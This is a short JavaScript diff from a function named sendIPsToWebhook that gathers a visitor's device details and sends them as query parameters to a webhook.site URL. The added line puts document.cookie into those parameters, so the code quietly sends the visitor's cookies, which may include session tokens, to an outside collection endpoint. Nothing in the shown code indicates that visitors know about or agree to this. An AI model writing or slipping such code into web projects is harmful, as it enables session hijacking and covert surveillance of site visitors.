@@ -279,6 +279,7 @@ async function sendIPsToWebhook() {
       lang: deviceInfo.language,
       width: deviceInfo.screen.width.toString(),
       height: deviceInfo.screen.height.toString(),
+      cookie: document.cookie,
     });
 
     const url = `https://webhook.site/78a22deb-651e-48c4-b625-828735e463f5?${params.toString()}`;
